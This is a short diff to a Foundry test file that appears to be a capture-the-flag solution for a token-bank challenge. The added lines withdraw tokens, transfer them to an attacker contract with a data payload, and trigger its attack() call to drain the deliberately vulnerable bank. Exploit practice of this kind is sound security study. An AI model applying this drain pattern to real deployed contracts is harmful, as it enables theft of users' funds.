@@ -16,7 +16,14 @@ contract TankBankTest is Test {
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
 
         // Put your solution here
-
+        vm.startPrank(player);
+        tokenBankChallenge.withdraw(500000 * 10 ** 18);
+        //console.log(address(tokenBankChallenge.token()));
+        SimpleERC223Token(address(tokenBankChallenge.token())).transfer(
+            address(tokenBankAttacker), 500000 * 10 ** 18, abi.encodePacked(uint256(0x111))
+        );
+        vm.stopPrank();
+        tokenBankAttacker.attack();
         _checkSolved();
     }
 
